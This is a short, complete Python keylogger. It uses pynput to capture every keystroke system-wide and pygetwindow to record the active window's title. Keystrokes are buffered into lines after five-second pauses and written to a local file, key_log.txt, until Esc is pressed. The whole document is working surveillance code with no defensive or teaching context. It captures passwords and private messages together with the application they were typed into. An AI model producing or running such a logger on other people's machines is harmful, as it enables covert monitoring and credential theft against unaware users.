import pygetwindow as gw
from pynput import keyboard
import time
log_file = 'key_log.txt'
last_press_time = time.time()
buffer = []

def on_press(key):
    global last_press_time, buffer
    current_time = time.time()
    
    # Check if 5 seconds have passed since the last key press
    if current_time - last_press_time > 5:
        # Write buffer to the file and start a new line
        with open(log_file, 'a') as f:
            if buffer:
                f.write(''.join(buffer) + '\n')
        buffer = []
    
    window = gw.getActiveWindow()
    window_title = window.title if window else 'No active window'
    
    # Log the active window title only if the buffer is empty (start of a new line)
    if not buffer:
        with open(log_file, 'a') as f:
            f.write(f'Window: {window_title} | ')
    
    # Append the key pressed to the buffer
    try:
        buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key}]')
    
    last_press_time = current_time

def on_release(key):
    if key == keyboard.Key.esc:
        return False

listener = keyboard.Listener(on_press = on_press, on_release = on_release)
listener.start()

listener.join()
